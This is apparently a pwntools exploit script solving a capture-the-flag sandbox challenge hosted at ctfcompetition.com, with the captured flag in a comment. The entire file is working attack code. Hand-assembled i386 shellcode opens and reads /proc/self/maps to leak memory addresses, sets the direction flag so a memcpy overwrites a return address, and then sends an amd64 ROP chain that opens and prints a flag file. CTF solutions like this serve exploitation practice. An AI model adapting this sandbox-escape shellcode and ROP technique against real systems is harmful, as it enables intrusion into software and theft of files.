#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.13"
port = 4869
host = "sandbox-compat.ctfcompetition.com"
port = 1337
r = remote(host,port)

#CTF{Hell0_N4Cl_Issue_51!}

sc1 =asm("""
    mov esp,0xbef00000
    sub esp,0x1600
    push 0x00737061
    push 0x6d2f666c
    push 0x65732f63
    push 0x6f72702f
        
    mov edi,2
    mov esi,esp
    xor edx,edx
    mov eax,0xdead0080
    push eax
    xor eax,eax
    dec eax
    shl eax,12
    push eax
    ret
""",arch="i386").ljust(0x80,"\x90") # open("/proc/self/maps")

sc2 = asm("""
    mov esi,eax
    xor eax,eax
    mov edi,eax
    mov edx,esp
    add edx,0x220
    mov ecx,0x1200

    mov eax,0xdead0100
    push eax
    xor eax,eax
    dec eax
    shl eax,12
    push eax
    ret

""",arch="i386").ljust(0x80,"\x90") # read(fd,buf,0x700)

sc3 = asm("""
    mov edx,esi
    mov edi,1
    mov esi,1
    mov ecx,0x700

    mov eax,0xdead0180
    push eax
    xor eax,eax
    dec eax
    shl eax,12
    push eax
    ret

""",arch="i386").ljust(0x80,"\x90") # write(1,buf,0x700)

sc4 = asm("""
    mov edi,0
    xor esi,esi
    mov edx,0xbeef0000
    mov ecx,0x200

    mov eax,0xdead0200
    push eax
    xor eax,eax
    dec eax
    shl eax,12
    push eax
    ret

""",arch="i386").ljust(0x80,"\x90") # read(0,stack,0x200)


sc5 =asm("""
    mov edi,2
    mov esi,0xbeef0100
    xor eax,eax
    dec eax
    shl eax,12
    push eax
    std
    ret
""",arch="i386").ljust(0x80,"\x90") #  Set direction flag,then memcpy will reverse. Overwrite the return address

gadget = asm("""
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    ret

""",arch="amd64")
sc = sc1 + sc2 + sc3 + sc4 + sc5 + gadget + "flag\x00"

flag = 0xdead0280 + len(gadget)
buf = 0xbeef0300

r.send(sc + "deadbeef")
context.arch = "amd64"
r.recvuntil("go...")
maps = r.recvuntil("syscall").split("\n")
code = int(maps[4].split("-")[0],16)
libc = int( maps[8].split("-")[0],16)
pop_rsp = code + 0x0000000000001143
pop_rdi_rsi_rdx_rcx = 0xdead0280
syscall =code +  0xce0

rop = flat([pop_rdi_rsi_rdx_rcx,2,flag,0,0,syscall,pop_rdi_rsi_rdx_rcx,0,4,buf,0x60,syscall,pop_rdi_rsi_rdx_rcx,1,1,buf,0x60,syscall]) 
payload = "a"*0xf8  + p64(pop_rsp) + p64(0xbeef0108) + rop

r.sendline(payload)
r.interactive()
